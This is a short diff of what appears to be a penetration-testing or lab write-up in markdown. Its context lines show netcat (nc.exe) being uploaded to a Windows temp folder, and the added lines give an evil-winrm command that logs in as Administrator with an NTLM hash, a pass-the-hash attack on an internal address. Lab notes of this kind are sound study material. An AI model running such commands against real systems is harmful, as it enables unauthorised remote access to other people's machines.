@@ -9,6 +9,11 @@ upload /usr/share/windows-resources/binaries/nc.exe c:\windows\tmp\nc.exe
 ```
 dir c:\windows\tmp\nc.exe
 ```
+
+```
+evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.87.150
+```
+
 ![[Pasted image 20231231234006.png]]
 
 Downloading
